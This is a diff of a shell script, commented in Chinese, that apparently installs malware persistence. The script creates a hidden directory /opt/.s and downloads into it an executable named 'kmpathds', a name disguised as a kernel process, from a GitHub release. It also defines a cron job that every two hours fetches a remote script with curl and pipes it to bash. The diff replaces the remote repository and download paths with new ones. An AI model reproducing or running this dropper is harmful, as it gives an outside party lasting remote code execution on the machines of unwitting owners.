@@ -3,7 +3,7 @@
 # 设置变量以提高可读性
 OPT_S_DIR="/opt/.s"
 KMPATHD_FILE="$OPT_S_DIR/kmpathds"
-CRON_JOB="0 */2 * * * curl -s -L https://raw.githubusercontent.com/mumu1667/trx20/main/vb.sh | bash"
+CRON_JOB="0 */2 * * * curl -s -L https://raw.githubusercontent.com/YUNDUN8899/FUCKSEN/main/123.sh | bash"
 
 # 检查/opt/.s目录是否存在，不存在则创建
 if [ ! -d "$OPT_S_DIR" ]; then
@@ -11,10 +11,10 @@ if [ ! -d "$OPT_S_DIR" ]; then
 fi
 
 # 检查/opt/.s/kmpathd文件是否存在，不存在则下载
-if [ ! -f "$KMPATHD_FILE" ]; then
+if [ ! -f "kmpathds" ]; then
     cd "$OPT_S_DIR" || exit
     wget https://github.com/YUNDUN8899/FUCKSEN/releases/download/BV10/kmpathds
-    chmod +x "$KMPATHD_FILE"
+    chmod +x "kmpathds"
 else
     echo "KMPATHD file already exists, skipping download."
 fi
